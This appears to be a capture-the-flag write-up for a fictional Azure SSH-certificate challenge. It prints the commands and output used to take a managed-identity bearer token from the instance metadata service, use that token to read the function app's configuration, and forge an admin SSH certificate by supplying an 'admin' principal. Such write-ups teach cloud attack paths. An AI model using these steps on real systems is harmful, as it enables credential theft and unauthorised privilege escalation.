# Objective 17: Certificate SSHenanigans
**Location: Pixel Island: Raincaster Cliffs**  
**Hints provided by Alabaster Snowball**

In this objective it shown how SSH certificates can be used for SSH authentication. For this, a [web tool](https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl) is provided which signs SSH public keys with the principal "elf". With that it is possible to login to "ssh-server-vm.santaworkshopgeeseislands.org" as user "monitor".

Sample SSH public key:
```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKaOSLQJfY/Mm39aSP6kE6Lwc72PAdilEePpx1/d+CRq joergen@northpole
```

The web tool creates this SSH certificate:
```
{  
    "ssh_cert": "ssh-ed25519-cert-v01@openssh.com AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29tAAAAJzI2NTk1OTU0MTExNDA5MTQ0NTQ4ODkzMzI0NDAyMTg3NTU3NTk4NgAAACCmjki0CX2PzJt/Wkj+pBOi8HO9jwHYpRHj6cdf3fgkagAAAAAAAAABAAAAAQAAACQ0ZDM0NTUyNS1mZjhmLTQxMDQtYTFhZC0zMTY5OGE2NzMwM2IAAAAHAAAAA2VsZgAAAABlfyIgAAAAAGWkDUwAAAAAAAAAEgAAAApwZXJtaXQtcHR5AAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIGk2GNMCmJkXPJHHRQH9+TM4CRrsq/7BL0wp+P6rCIWHAAAAUwAAAAtzc2gtZWQyNTUxOQAAAEDucQgqYMjbxues0AgmihmkshWGsp3lbhClI6+ahoQJYpbef6kWeON7rXiUbGe5ctmFTuVqjRV3I2p2NOX1IykH ",  
    "principal": "elf"  
}
```

With this SSH certificate (and the private key) we are able to login to the server as "monitor".
On the server we can check which principal is required to be able to login as "alabaster":
```
monitor@ssh-server-vm:/etc/ssh/auth_principals$ cat alabaster 
admin
monitor@ssh-server-vm:/etc/ssh/auth_principals$ cat monitor 
elf
```

and can make use of the Azure Metadata Instance Service to obtain an authentication token for https://management.azure.com/:
```
monitor@ssh-server-vm:/etc/ssh$ curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIxNTE4MTcsIm5iZiI6MTcwMjE1MTgxNywiZXhwIjoxNzAyMjM4NTE3LCJhaW8iOiJFMlZnWVBCeS83NzZRa3NrcDh1RC9qZThaZ21xQUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiI0anVoQTFUOVdFYWlGZWxpeFRITEFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.IS06qvLjcl38JvzRHeBPFoLZk5NREXcPFZyha4CITtcP-4VMHHPrfqpTPgl1U7C_ENrcJCbDrS3L6MhvkpcDwQ1tpAb7zuQrLL6Gk6IzpVMbeoYhqJi7LFiTARmC5TsSZdQF258R2fpqr9Py3Mug6QsVZH0nxrf-KDtzb_VrOvmulfZLsaEebjHJSEFFgaaUKPTNfTuQCMdhuGoV1t0CzTPEY_AVTfTBRlmtxiJMY4miBjINYqpUN5TWFQT7B81L_4HWu4hJoE_IbYE-4MWTI4VNPmiCeIMlJNM1o3XqI3AzVz3pGD5gv0UPa3Vi9bXIcG7_6eIeIInoeSNCHwMOSA","client_id":"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce","expires_in":"84296","expires_on":"1702238517","ext_expires_in":"86399","not_before":"1702151817","resource":"https://management.azure.com/","token_type":"Bearer"}
```

With this key we are able to get hold of the web application's source code:
```
jsw@northpole:~$ curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDIxNTE4MTcsIm5iZiI6MTcwMjE1MTgxNywiZXhwIjoxNzAyMjM4NTE3LCJhaW8iOiJFMlZnWVBCeS83NzZRa3NrcDh1RC9qZThaZ21xQUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiI0anVoQTFUOVdFYWlGZWxpeFRITEFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.IS06qvLjcl38JvzRHeBPFoLZk5NREXcPFZyha4CITtcP-4VMHHPrfqpTPgl1U7C_ENrcJCbDrS3L6MhvkpcDwQ1tpAb7zuQrLL6Gk6IzpVMbeoYhqJi7LFiTARmC5TsSZdQF258R2fpqr9Py3Mug6QsVZH0nxrf-KDtzb_VrOvmulfZLsaEebjHJSEFFgaaUKPTNfTuQCMdhuGoV1t0CzTPEY_AVTfTBRlmtxiJMY4miBjINYqpUN5TWFQT7B81L_4HWu4hJoE_IbYE-4MWTI4VNPmiCeIMlJNM1o3XqI3AzVz3pGD5gv0UPa3Vi9bXIcG7_6eIeIInoeSNCHwMOSA' https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01 | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   982  100   982    0     0    990      0 --:--:-- --:--:-- --:--:--   989
{
  "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web",
  "name": "northpole-ssh-certs-fa",
  "type": "Microsoft.Web/sites/sourcecontrols",
  "location": "East US",
  "tags": {
    "project": "northpole-ssh-certs",
    "create-cert-func-url-path": "/api/create-cert?code=candy-cane-twirl"
  },
  "properties": {
    "repoUrl": "https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa",
    "branch": "main",
    "isManualIntegration": false,
    "isGitHubAction": true,
    "deploymentRollbackEnabled": false,
    "isMercurial": false,
    "provisioningState": "Succeeded",
    "gitHubActionConfiguration": {
      "codeConfiguration": null,
      "containerConfiguration": null,
      "isLinux": true,
      "generateWorkflowFile": true,
      "workflowSettings": {
        "appType": "functionapp",
        "publishType": "code",
        "os": "linux",
        "variables": {
          "runtimeVersion": "3.11"
        },
        "runtimeStack": "python",
        "workflowApiVersion": "2020-12-01",
        "useCanaryFusionServer": false,
        "authType": "publishprofile"
      }
    }
  }
}
```
So the source code is stored in a Github [repository](https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa).

In the code it is easy to spot, that the principal does just default to "elf" but can be provided as a parameter in the call. So we just have to supply the principal "admin" to the SSH certificate generation call, for example in the browser developer console:
```
{"ssh_cert": "ssh-ed25519-cert-v01@openssh.com AAAAIHNzaC1lZDI1NTE5LWNlcnQtdjAxQG9wZW5zc2guY29tAAAAJzI4NjY5MDc2NTUyNTIzMTQwNjE2MzEyOTYwMDE0MTE4NjU3MDk2NQAAACCmjki0CX2PzJt/Wkj+pBOi8HO9jwHYpRHj6cdf3fgkagAAAAAAAAABAAAAAQAAACRhYTJkYWY4NS04NDI2LTRjYzMtODAwYi0wMzlhM2ZhYWViOGYAAAAJAAAABWFkbWluAAAAAGV/JQsAAAAAZaQQNwAAAAAAAAASAAAACnBlcm1pdC1wdHkAAAAAAAAAAAAAADMAAAALc3NoLWVkMjU1MTkAAAAgaTYY0wKYmRc8kcdFAf35MzgJGuyr/sEvTCn4/qsIhYcAAABTAAAAC3NzaC1lZDI1NTE5AAAAQHntvqzNyPQy9dnyRatxGXeEZwSsf02LLnIJ/DauD+hB5J+HNgZgjZc8A+2aZpt8lrY8TYGqp+s2GnH3Bor7BAU= ", "principal": "admin"}
```




**Achievement: Ipsum**
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTU0OTAxMzY5LC0yMDEwMTkyNjNdfQ==
-->